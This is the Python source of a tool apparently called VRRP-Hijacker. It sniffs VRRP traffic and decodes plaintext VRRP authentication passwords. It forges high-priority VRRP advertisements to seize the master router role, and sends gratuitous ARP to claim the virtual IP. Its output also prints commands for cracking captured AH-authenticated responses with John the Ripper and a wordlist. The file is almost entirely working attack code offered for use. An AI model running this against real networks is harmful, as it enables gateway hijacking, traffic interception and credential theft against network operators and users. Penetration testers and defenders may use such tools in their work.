import argparse
import time
import os
from scapy.all import sendp, sniff, wrpcap, get_if_hwaddr, ARP, Ether
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.layers.vrrp import VRRP, VRRPv3
from scapy.layers.ipsec import AH

# Terminal color codes
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"

def print_info(msg):
    print(f"{BLUE}[*] {msg}{RESET}")

def print_success(msg):
    print(f"{GREEN}[+] {msg}{RESET}")

def print_warning(msg):
    print(f"{YELLOW}[-] {msg}{RESET}")

def print_error(msg):
    print(f"{RED}[!] {msg}{RESET}")

def vrrp_packet_callback(packet):
    if VRRP in packet or VRRPv3 in packet or AH in packet:
        print_success("Packet Captured!")
        print(BOLD + "============================" + RESET)

        if VRRP in packet:
            vrrp = packet[VRRP]
            if vrrp.version == 2:
                print_success(f"VRRP Version: {vrrp.version}")
                print_success(f"VRID (Virtual Router ID): {vrrp.vrid}")
                print_success(f"VRRP Priority: {vrrp.priority}")
                print_success(f"VIP(s): {vrrp.addrlist}")
                print_success(f"Advertisement Interval: {vrrp.adv} sec")
                if vrrp.authtype == 0:
                    print_success("No authentication required")
                elif vrrp.authtype == 1:
                    password = decode_vrrp_password(vrrp.auth1, vrrp.auth2)
                    print_success(f"VRRP Plain Text Password: {password}")
                else:
                    print_warning("VRRP Auth type: AH Header (IPSec)")
                    print_warning("You need to crack the 'VRRP' response before launching your attack")

        elif VRRPv3 in packet:
            vrrp = packet[VRRPv3]
            print_success(f"VRRP Version: {vrrp.version}")
            print_success(f"VRID (Virtual Router ID): {vrrp.vrid}")
            print_success(f"VRRP Priority: {vrrp.priority}")
            print_success(f"VIP(s): {vrrp.addrlist}")
            print_success("In VRRPv3, no authentication is required")

        elif AH in packet:
            print_success("VRRP Version: 2")
            print(BOLD + "#### AH Packet Captured ####" + RESET)
            print_success(f"Authentication Header (AH) Data: {packet[AH].payload}")
            print_success(f"AH Authentication Data (Raw): {bytes(packet[AH])}")
            print_success("Next step: Crack the VRRP response to get the plaintext password.")
            print_success("pcap2john.py vrrp-auth-header.pcapng | tee pcap2john_format")
            print_success("john --wordlist=/opt/rockyou.txt pcap2john_format")

        print_success(f"Master IP: {packet[IP].src}")
        print(BOLD + "============================" + RESET)
    else:
        print_warning("No VRRP traffic detected on the selected interface.")

def decode_vrrp_password(auth1, auth2):
    """Convert auth1 and auth2 fields into a readable password."""
    raw_bytes = auth1.to_bytes(4, 'big') + auth2.to_bytes(4, 'big')
    return raw_bytes.decode(errors="ignore")

def sniff_vrrp(interface, output_file="VRRP_network_capture.pcap"):
    sniffed_packets = []

    print_info(f"Listening for VRRP traffic on {interface}...")

    def packet_callback(packet):
        sniffed_packets.append(packet)
        vrrp_packet_callback(packet)

    sniff(filter="vrrp or ip", iface=interface, prn=packet_callback, store=True)

    if sniffed_packets:
        wrpcap(output_file, sniffed_packets)
        print_info(f"Captured packets saved to {output_file}")
    else:
        print_warning("No VRRP packets captured.")


def send_vrrp_packet(src_ip, vip, vrid, priority, iface, vrrp_version):
    """Send a VRRP or VRRPv3 packet."""
    packet = Ether(dst="01:00:5e:00:00:12") / IP(src=src_ip, dst="224.0.0.18", ttl=255)

    if vrrp_version == 2:
        packet /= VRRP(vrid=vrid, priority=priority, addrlist=[vip])
    elif vrrp_version == 3:
        packet /= VRRPv3(vrid=vrid, priority=priority, addrlist=[vip])

    sendp(packet, iface=iface, verbose=False)
    print_success(f"VRRP Packet Sent - VRID={vrid}, Priority={priority}, VIP={vip}, Version={vrrp_version}")

def exploit_vrrp(src_ip, vrid, priority, iface, vip, vrrp_version, num_packets, interval):
    """Send multiple VRRP packets with a configurable interval."""
    for i in range(num_packets):
        print_info(f"Sending packet {i+1}/{num_packets} with a {interval}-sec delay...")
        send_vrrp_packet(src_ip, vip, vrid, priority, iface, vrrp_version)
        time.sleep(interval)

def add_ip(iface, ip):
    os.system(f"sudo ip addr add {ip}/24 dev {iface}")
    print_info(f"IP address {ip} added to {iface}")

def del_ip(iface, ip):
    os.system(f"sudo ip addr del {ip}/24 dev {iface}")
    print_info(f"IP address {ip} removed from {iface}")

def send_gratuitous_arp(iface, ip, interval, count):
    mac = get_if_hwaddr(iface)
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, hwsrc=mac, psrc=ip, hwdst="00:00:00:00:00:00", pdst=ip)

    for i in range(count):
        print_success(f"[{i+1}/{count}] Sending Gratuitous ARP: {ip} is at {mac}")
        sendp(packet, iface=iface, verbose=False)
        time.sleep(interval)
    del_ip(iface, ip)

def main():
    
    parser = argparse.ArgumentParser(description="")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    sniff_parser = subparsers.add_parser("sniff", help="Monitor your network for detecting VRRP traffic")
    sniff_parser.add_argument("-i", "--interface", required=True, help="Network interface to listen on")
    sniff_parser.add_argument("-o", "--output", default="VRRP_network_capture.pcap", help="Output .pcap file for analysis")

    exploit_parser = subparsers.add_parser("exploit", help="Exploit VRRP (Layer 3)")
    exploit_parser.add_argument("--src-ip", required=True, help="Source IP of the VRRP router")
    exploit_parser.add_argument("--vrid", type=int, required=True, help="VRRP Virtual Router ID (VRID)")
    exploit_parser.add_argument("--priority", type=int, required=True, help="VRRP Priority")
    exploit_parser.add_argument("--iface", required=True, help="Network interface to use")
    exploit_parser.add_argument("--vip", required=True, help="Virtual IP (VIP)")
    exploit_parser.add_argument("--vrrp-version", type=int, choices=[2, 3], required=True, help="VRRP Version (2 or 3)")
    exploit_parser.add_argument("--vrrp-num-packets", type=int, default=5, help="Number of packets to send")
    exploit_parser.add_argument("--interval", type=int, default=1, help="Time interval between packets (seconds)")

    arp_parser = subparsers.add_parser("arp", help="Send gratuitous ARP packets (Layer 2)")
    arp_parser.add_argument("--arp-interval", type=float, default=1, help="Interval between announcements (seconds)")
    arp_parser.add_argument("--arp-count", type=int, default=5, help="Number of packets to send")
    arp_parser.add_argument("--add-ip", action="store_true", help="Add the IP to the interface before sending ARPs")
    arp_parser.add_argument("--del-ip", action="store_true", help="Remove the IP from the interface after sending ARPs")
    arp_parser.add_argument("--iface", required=True, help="Network interface to use")
    arp_parser.add_argument("--vip", required=True, help="Virtual IP (VIP)")

    args = parser.parse_args()

    if args.mode == "sniff":
        sniff_vrrp(args.interface, args.output)
    elif args.mode == "exploit":
        exploit_vrrp(args.src_ip, args.vrid, args.priority, args.iface, args.vip, args.vrrp_version, args.vrrp_num_packets, args.interval)
    elif args.mode == "arp":
        if args.add_ip:
            add_ip(args.iface, args.vip)
            send_gratuitous_arp(args.iface, args.vip, args.arp_interval, args.arp_count)
        elif args.del_ip:
            del_ip(args.iface, args.vip)

if __name__ == "__main__":
    print (r"""  
     _   _ _____ _____ _____       _   _ _ _            _
    | | | | ___ \ ___ \ ___ \     | | | (_|_)          | |            
    | | | | |_/ / |_/ / |_/ /_____| |_| |_ _  __ _  ___| | _____ _ __ 
    | | | |    /|    /|  __/______|  _  | | |/ _` |/ __| |/ / _ \ '__|
    \ \ / / |\ \| |\ \| |         | | | | | | (_| | (__|   <  __/ |   
     \___/\_| \_\_| \_\_|         |_| |_/ |_| __,_|\___|_|\_\___|_|   
                                          / |                         
                                         /_/ 
    v1.0
    author : @archidote 
 
                                                           
    """)
    main()